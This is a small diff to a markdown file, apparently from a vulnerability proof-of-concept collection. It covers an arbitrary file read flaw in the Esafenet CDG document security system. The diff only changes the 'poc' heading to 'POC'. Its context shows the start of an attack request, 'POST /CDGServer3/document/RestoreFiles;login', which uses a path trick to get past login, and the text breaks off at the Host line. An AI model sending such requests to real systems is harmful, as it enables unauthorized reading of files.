@@ -1,7 +1,7 @@
 ## 亿赛通电子文档安全管理系统RestoreFiles任意文件读取漏洞
 
 
-## poc
+## POC
 ```
 POST /CDGServer3/document/RestoreFiles;login HTTP/1.1
 Host:
